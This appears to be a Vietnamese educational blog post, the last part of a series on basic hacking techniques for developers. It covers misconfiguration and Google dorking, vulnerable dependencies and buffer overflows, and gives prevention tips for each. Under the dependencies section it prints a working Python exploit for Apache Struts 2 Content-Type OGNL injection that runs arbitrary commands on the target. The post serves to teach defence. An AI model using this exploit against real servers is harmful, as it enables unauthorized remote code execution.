## Part 1-5
[Part 1](https://viblo.asia/p/cac-ki-thuat-hack-co-ban-lap-trinh-vien-nen-biet-phan-1-gDVK2BvrKLj) -
[Part 2](https://viblo.asia/p/cac-ki-thuat-hack-co-ban-lap-trinh-vien-nen-biet-phan-2-4dbZN92gKYM) - 
[Part 3](https://viblo.asia/p/cac-ki-thuat-hack-co-ban-lap-trinh-vien-nen-biet-phan-3-bWrZnWQ9lxw) - 
[Part 4](https://viblo.asia/p/cac-ki-thuat-hack-co-ban-lap-trinh-vien-nen-biet-phan-4-GrLZDJon5k0) - 
[Part 5](https://viblo.asia/p/cac-ki-thuat-hack-co-ban-lap-trinh-vien-nen-biet-phan-5-Qbq5Qa7w5D8)
## Part 6
### Lax security settings
Đã đọc đến phần này của series thì chắc mọi người cũng không lạ gì với việc dùng google để hack. Với các từ khoá như `intitle:`, `intext:`, hay `inurl:`,... hacker tìm kiếm các chương trình bị cấu hình lỏng lẻo. Như các database, phần mềm quản lý, hay camera,... đăng nhập với tài khoản mặc định.

Các thư mục bảo không được bảo mật trên máy chủ,
![](https://images.viblo.asia/1010bb4f-a1a2-444c-b381-331abb2bf2a2.png)

hay những sản phẩm quên tắt chức năng debug, hoặc vẫn để môi trường thử nghiệm cũng là đối tượng bị ngắm đến
![](https://images.viblo.asia/3884abbc-338c-4b67-86f8-11e5e9b03a11.png)

Và tất nhiên, web admin cũng là một phần thường xuyên bị nhắm đến
 ![](https://images.viblo.asia/80cb336c-a089-420b-a08d-60b64250a075.png)

#### Phòng chống
##### 1. Tự động hoá quá trình Build để tránh việc sơ xuất khi quên này quên kia mỗi khi thực hiện
##### 2. Xem lại các thành phần phần mềm mới và vô hiệu hóa thông tin đăng nhập mặc định càng sớm càng tốt
##### 3. Tách biệt phần code và phần cài đặt cấu hình
##### 4. Tạo tài khoản chuyên dụng với các đặc quyền thích hợp
##### 5. Viết kịch bản cho quá trình triển khai của bạn
##### 6. Tách biệt các môi trường develop, test, product,...
##### 6. Thêm bảo mật bổ sung cho hệ thống quản trị


### Toxic dependencies
Là trường hợp các parkage ngoài chứa mã độc hoặc chính bản thân các phần mềm, framework chứa những lỗ hổng bảo mật chưa được phát hiện dẫn đến rủi ro cho sản phẩm.

Có thể kể đến một vài trường hợp (nguồn: hacksplaining.com)
+ Apache struts, phiên bản 2 của nó đã không "làm sạch" Content-Type đúng cách, đến đến việc hacker có thể đẩy vào đó các đoạn script nhỏ và thực thi trên server
```python
import urllib2
import httplib

def exploit(url, cmd):
  payload = "%{(#_='multipart/form-data')."
  payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
  payload += "(#_memberAccess?"
  payload += "(#_memberAccess=#dm):"
  payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
  payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
  payload += "(#ognlUtil.getExcludedPackageNames().clear())."
  payload += "(#ognlUtil.getExcludedClasses().clear())."
  payload += "(#context.setMemberAccess(#dm))))."
  payload += "(#cmd='%s')." % cmd
  payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
  payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
  payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
  payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
  payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
  payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
  payload += "(#ros.flush())}"

  try:
    headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
    request = urllib2.Request(url, headers=headers)
    page = urllib2.urlopen(request).read()
  except httplib.IncompleteRead, e:
    page = e.partial

  return page
  ```
  
  + Ruby on Rails, phiển bản 3.0 có một lỗi liên quan đến việc gán dữ liệu tuỳ ý, nghĩa là có thể tạo một request để ghi đè  trạng thái bảo vệ, rất may, nó được 1 hacker mũ trắng phát hiện
```ruby
def assign_attributes(new_attributes)
    if !new_attributes.respond_to?(:stringify_keys)
        raise ArgumentError, "When assigning attributes, you must pass a hash as an argument."
    end
    return if new_attributes.blank?

    attributes                  = new_attributes.stringify_keys
    multi_parameter_attributes  = []
    nested_parameter_attributes = []

    attributes = sanitize_for_mass_assignment(attributes)

    attributes.each do |k, v|
        if k.include?("(")
            multi_parameter_attributes << [ k, v ]
        elsif v.is_a?(Hash)
            nested_parameter_attributes << [ k, v ]
        else
            _assign_attribute(k, v)
        end
    end

    assign_nested_parameter_attributes(nested_parameter_attributes) unless nested_parameter_attributes.empty?
    assign_multiparameter_attributes(multi_parameter_attributes) unless multi_parameter_attributes.empty?
end
```

#### Phòng chống
##### 1. Automate your build and deployment processes
##### 2. Deploy known-good versions of software
##### 3. Be careful of private dependencies
##### 4. Dùng tool chuyên dụng để đánh giá nguy cơ bảo mật
##### 5. Luôn cập nhập các bản bảo mật
##### 6. Review code định kỳ
##### 7. Make penetration testing part of your development lifecycle

### Buffer overflows - tràn bộ đệm
Khi dữ liệu đầu vào có độ dài vượt ra ngoài biên của bộ nhớ đệm có độ dài cố định, nó sẽ ghi đè lên các bộ nhớ đệm liền kề, Dữ liệu bị ghi đè có thể bao gồm các bộ nhớ đệm khác, các biến và dữ liệu điều khiển luồng chảy của cả chương trình. Lỗi này thường xảy ra với các ngôn ngữ như C hoặc C++ khi mà việc xử lý bộ nhớ đệm phải thực hiện thủ công.

Hacker có thể lợi dụng lỗi này, đẩy lên một lượng lớn dữ liệu cùng lúc gây trèo server, tương tự như tấn công DDoS, hoặc chèn các đoạn mã độc vào phần ghi dữ liệu bị tràn, qua đó thực hiện các thủ thuật tấn công khác

![](https://images.viblo.asia/62a999d8-7655-4e65-9607-912ec739df0d.PNG)

Cách khai thác chia thành 2 loại chính khai thác lỗi tràn trên stack và Khai thác lỗi tràn trên heap, ngoài ra còn một số cách khác, chúng đều hướng đến việc thay đổi hành vi chương trình tạo thuận lợi cho hacker

## Lời kết
Cuối cùng thì sau một thời gian dài, tôi cũng hoàn thành được series đầu tiên về bảo mật, dù chỉ là nhưng là bản tóm tắt cơ bản, tổng hợp, nhưng bản thân tôi cũng có chút tự hào. Dự kiến *hôm nào đó* có thể tôi sẽ là viết kĩ hơn về từng loại, sẽ vẫn là lần mò, viết bậy thôi, nhưng vẫn mong mọi người sẽ ủng hộ.

*Nguồn:* 
+ https://www.hacksplaining.com/
+ https://viblo.asia/
+ internet